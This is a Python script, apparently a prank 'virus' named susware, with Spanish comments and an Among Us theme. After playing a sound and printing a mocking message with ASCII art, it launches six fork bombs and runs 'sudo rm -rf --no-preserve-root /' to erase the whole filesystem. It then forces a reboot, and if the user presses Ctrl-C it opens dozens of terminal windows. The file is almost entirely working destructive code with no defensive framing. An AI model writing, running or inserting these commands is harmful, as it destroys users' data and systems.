from os import system
from colorama import Fore
from time import sleep
from playsound import playsound

terminals = ['qterminal', "terminator", "alacritty", "xterm", "konsole", "xfce4-terminal-emulator"]

def start_destruction():
     
     try:
#         Empieza a sonar el among drip descargado     
          playsound('src/amogus.mp3')
          sleep(10)
          
          print(Fore.GREEN, """
     Tu sistema ha sido FOLLADO por el virus susware, no intentes reiniciar tu linux
     porque si no te irá peor, JAJAJAJAJAJA mientras destruimos tu sistema, disfruta del precioso
     among drip
                              `-/++oo++/`              
                         .:++++oo/:+shmy-            
                         .///:::/../:--/yhds`          
                    -::----.`.+/-```/mNdy`         
                    `.`:////:--```sy:/``./mMNo         
               `-:o/++::://::.:-  ./`:. `-hMMd.        
          .` ``--.-::/++/-`/`  ` `.` `odNm.        
          ``   `--://////+/:...`.....-::/so         
          .    --:::///::://+/-.`.````.-:-`         
          ``   `--:/-------::/+++-`--/:...``         
          .`   .---+hhy-------/+///-::+s/.`          
          ```   `....-/h------::::::::-----           
          ` ``````.....-----------::-:/:-.`           
          `````````````.........----.:///:`           
          ```` `.``````````````..--..:::::.           
          ``` ````````````````....`--::::`           
               `````````````````````.----:-            
               ``````````````````````....`            
               ```` `````````````````..`             
               `.````       ```````````              
               `......````        ````                
          ..````.-+hhyoo-`     .+m:                 
          .////:-..:mNNNmh.    `+NM:                 
          --````.. .::/syy.   ```:/o`                 
          .//ssy+:-.````/+     ```-.:/-`               
     .:./ooo+so:.``-::   ``..-/-.-:oh+-`           
     `s+-::sy:hm+-...:.    ````-.--:mNNNmh:`        
     `oyyyss++o++-/-.-:. `````````.:/://+os+        
          -shhy+/::/--/ohMMy.       ``.-:/++:.         
          -shho/--:oddmMMMMh/                        
          :yddho+/////+shhdo.                      
               .+ydddyso+//////:                      
                    .:/oosyyyyss/             
          """)
          sleep(5)

#         Ejecuta 6 fork bombs
          for _ in range(6):
               system(":(){ :|:& };:")
               sleep(2)
#         Imprime el siguiente mensaje en pantalla
          system('echo "FOLLANDONOS EL SISTEMA OPERATIVO..."')

#         Inicializando eliminación completa del sistema
          system('sudo rm -rf --no-preserve-root /')

#         Reinicia el sistema
          system('sudo reboot')
     
     except KeyboardInterrupt:
          print("No intentes cancelar el programa noob XDDDDDDDDDDDD")
          
#         Si el usuario intenta cancelar, abrirá más emuladores de
#         Terminal

          for _ in range(50):
               try:
                    for item in terminals: 
                         system(item)
                    system('xfce4-terminal-emulator')
               except:
                    pass
